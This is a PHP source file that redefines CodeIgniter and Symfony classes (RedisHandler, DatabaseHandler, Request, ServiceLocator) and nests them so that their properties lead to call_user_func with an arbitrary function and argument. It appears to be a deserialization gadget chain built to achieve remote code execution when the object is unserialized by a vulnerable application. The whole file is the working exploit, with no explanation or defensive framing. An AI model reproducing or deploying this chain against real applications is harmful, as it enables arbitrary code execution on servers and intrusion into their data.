<?php

namespace CodeIgniter\Cache\Handlers
{
    class RedisHandler
    {
        protected $redis;

        function __construct($function, $paramter)
        {
            $this->redis = new \CodeIgniter\Session\Handlers\DatabaseHandler($function, $paramter);
        }
    }
}

namespace CodeIgniter\Session\Handlers
{
    class DatabaseHandler
    {
        protected $lock;
        protected $platform='mysql';
        protected $db;

        function __construct($function, $parameter)
        {
            $this->lock = new \Symfony\Component\HttpFoundation\Request($function, $parameter);
            $this->db = new \CodeIgniter\Database\MySQLi\Connection();
        }
    }
}

namespace Symfony\Component\HttpFoundation
{
    class Request
    {
        public $server;
        public $cookies;

        function __construct($function, $paramter)
        {
            $this->cookies = ["key" => "value"];
            $this->server = new \Symfony\Component\DependencyInjection\Argument\ServiceLocator($function, $paramter);
        }
    }
}

namespace Symfony\Component\DependencyInjection\Argument
{
    class ServiceLocator
    {
        private $serviceMap;
        private $factory;

        function __construct($function, $paramter)
        {
            $this->factory = "call_user_func";
            $this->serviceMap = ["REQUEST_METHOD" => [$function, $paramter]];
        }
    }
}

namespace CodeIgniter\Database\MySQLi
{
    class Connection
    {
        function __construct()
        {
        }
    }
}